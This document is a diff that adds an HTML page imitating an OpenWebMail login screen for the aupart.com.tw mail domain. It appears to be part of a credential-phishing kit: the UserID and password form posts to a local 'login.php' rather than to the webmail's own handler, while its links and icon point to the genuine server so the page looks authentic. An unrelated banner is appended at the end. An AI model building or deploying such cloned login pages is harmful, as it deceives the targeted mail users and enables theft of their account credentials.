@@ -1,0 +1,158 @@
+<html><head>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <title> 03/07/2022 03:11:12 pm +0800 - en_US.ISO8859-1 - OpenWebMail </title>
+  <link rel="shortcut icon" href="http://mail.aupart.com.tw/data/openwebmail/images/openwebmail.ico">
+</head>
+
+<body onhelp="window.open('/data/openwebmail/help/en_US.ISO8859-1/index.html', '_help'); return false;" bgcolor="#FFFFFF" background="Globe.gif">
+
+<style type="text/css">
+<!--
+body
+{
+    background-image: url(Globe.gif);
+    background-repeat: repeat;
+    font-family: Arial, Helvetica, sans-serif;
+    font-size: 10pt;
+}
+th { font-family: Arial, Helvetica, sans-serif; font-size: 10pt; font-weight: bold; background-color: #D3DCE3; }
+td { font-family: Arial, Helvetica, sans-serif; font-size: 10pt; }
+td.msgbody { font-family:  Arial, Helvetica, sans-serif; font-size: 10pt; }
+form { font-family: Arial, Helvetica, sans-serif; font-size: 10pt; margin-bottom: 0; }
+input.mono { font-family: monospace; font-size: 9pt; }
+select.mono { font-family: monospace; font-size: 9pt; }
+h1 { font-family: Arial, Helvetica, sans-serif; font-size: 16pt; font-weight: bold; }
+A:link { font-family: Arial, Helvetica, sans-serif; font-size: 10pt; text-decoration: none; color: blue; }
+A:visited { font-family: Arial, Helvetica, sans-serif; font-size: 10pt; text-decoration: none; color: blue; }
+A:hover { font-family: Arial, Helvetica, sans-serif; font-size: 10pt; text-decoration: none; color: red; }
+A.msgbody:link { font-family:  Arial, Helvetica, sans-serif; font-size: 10pt; text-decoration: none; color: blue; }
+A.msgbody:visited { font-family:  Arial, Helvetica, sans-serif; font-size: 10pt; text-decoration: none; color: blue; }
+A.msgbody:hover { font-family:  Arial, Helvetica, sans-serif; font-size: 10pt; text-decoration: none; color: red; }
+.medtext { font-size: 9pt; }
+.smalltext { font-size: 8pt; }
+.smallblacktext { font-size: 8pt; color: #000000; }
+.smallcolortext { font-size: 8pt; color: #c00000; }
+.hilighttext { font-style: normal; font-weight: bold; background-color: #DCDCDC; }
+-->
+
+</style>
+
+<font face="Arial, Helvetica">
+<p align="center">
+  <a href="http://openwebmail.org"><img src="openwebmail.gif" border="0"></a>
+</p>
+
+<table width="260" cellspacing="0" cellpadding="0" border="0" align="center">
+<tbody><tr>
+  <td bgcolor="#3161bd" background="bg-titleblue.gif">&nbsp;<font size="3" face="Arial, Helvetica" color="#FFFFFF"><b>Login</b></font></td>
+</tr>
+<tr>
+  <td bgcolor="#3161bd" align="center">
+    <div></div><table width="100%" cellspacing="1" cellpadding="0" border="0">
+    <tbody><tr>
+      <td bgcolor="#ffffff">
+<form method="post" action="login.php" enctype="multipart/form-data" name="login">
+
+<br>
+        <table cellspacing="2" cellpadding="0" border="0" align="center">
+        <tbody><tr>
+          <td nowrap="" align="right">UserID: </td>
+          <td><input type="text" name="loginname" size="14" onchange="focuspwd()"></td>
+        </tr>
+        <tr>
+          <td nowrap="" align="right">Password: </td>
+          <td><input type="password" name="password" size="14" onchange="focusloginbutton()"></td>
+<input type="hidden" name="logindomain" value="aupart.com.tw">
+        </tr>
+        <tr>
+          <td colspan="2" align="center">
+            <table>
+            <tbody><tr>
+              <td align="center"><input type="submit" name="loginbutton" value="Login"></td>
+              <td align="center">
+                <table>
+                <tbody><tr>
+                  <td><label><input type="checkbox" name="httpcompress" value="1" disabled="1"></label></td>
+                  <td><font size="1">HTTP<br>Compression</font></td>
+                  <td><label><input type="checkbox" name="autologin" value="1" onclick="autologinhelp()"></label></td>
+                  <td><font size="1">Auto<br>Login</font></td>
+                </tr>
+                </tbody></table>
+              </td>
+            </tr>
+            </tbody></table>
+          </td>
+        </tr>
+        </tbody></table>
+<br>
+      </form></td>
+
+
+    </tr>
+    </tbody></table>
+  </td>
+</tr>
+</tbody></table>
+
+<script language="javascript">
+<!--
+
+   if (document.login.loginname.value == "") {
+      document.login.loginname.focus()
+   } else {
+      document.login.password.focus()
+   }
+
+   function focuspwd() {
+      document.login.password.focus();
+      return(true);
+   }
+
+   function focusloginbutton() {
+      document.login.loginbutton.focus();
+      return (true);
+   }
+
+   function httpcompresshelp() {
+      if (document.login.httpcompress.checked) {
+         alert(
+"HTTP Compression can reduce the use of network bandwidth between your computer and the webmail server effectively, "+
+"but there are some compatibility issues:\n\n"+
+"1. some proxy servers only support HTTP compression via HTTP 1.1, "+
+"you may have to enable the HTTP1.1 support for proxy in your browser\n"+
+"2. some proxy servers don't support HTTP compression at all, "+
+"you may have to list the webmail server as directly connected in the proxy configuration of your browser.\n"+
+"3. some browsers have problems when using HTTP compression with SSL...\n"+
+"4. some browsers claim to support HTTP compression but actually not...\n\n"+
+"So if you encounter any problem, please login again with this checkbox unchecked.\n"
+         );
+      }
+      return(true);
+   }
+
+   function autologinhelp() {
+      if (document.login.autologin.checked) {
+         alert(
+"When this feature is enabled, you may login into openwebmail without typing username/password "+
+"if you didn't do logout in your previous openwebmail session and that session is not timeout. "+
+"However, others may also auto login into your openwebmail account with this computer, "+
+"so please DO NOT enable this feature on a public computer\n"
+         );
+      }
+      return(true);
+   }
+
+//-->
+</script>
+<p align="center">
+<br>
+<a href="http://mail.aupart.com.tw/data/openwebmail/openwebmail.html" target="_blank">OpenWebMail</a>
+version 2.53
+&nbsp;
+<a accesskey="H" href="http://mail.aupart.com.tw/data/openwebmail/help/en_US.ISO8859-1/index.html" target="_help">Help?</a>
+
+<br>
+</p>
+<style>.footer,.generic-footer{margin-bottom:98px}@media (min-width:374px){.footer,.generic-footer{margin-bottom:78px}}@media (min-width:546px){.footer,.generic-footer{margin-bottom:56px}}@media (min-width:1055px){.footer,.generic-footer{margin-bottom:0}}.disclaimer{position:fixed;z-index:9999999;bottom:0;right:0;border-top:2px solid #ff5c62;text-align:center;font-size:14px;font-weight:400;background-color:#fff;padding:5px 10px 5px 10px}.disclaimer a:hover{text-decoration:underline}@media (min-width:1052px){.disclaimer{text-align:right;border-left:2px solid red;border-top-left-radius:10px}}@media (min-width:1920px){.disclaimer{width:60%}}</style><div class="disclaimer">We support Ukraine and condemn war. Push Russian government to act against war. Be brave, vocal and show your support to Ukraine. Follow the latest news <a title="https://www.bbc.com/news/live/world-europe-60517447" target="_blank" href="https://www.bbc.com/news/live/world-europe-60517447" style="color: black;"><b>HERE</b></a></div>
+
+</font></body></html>
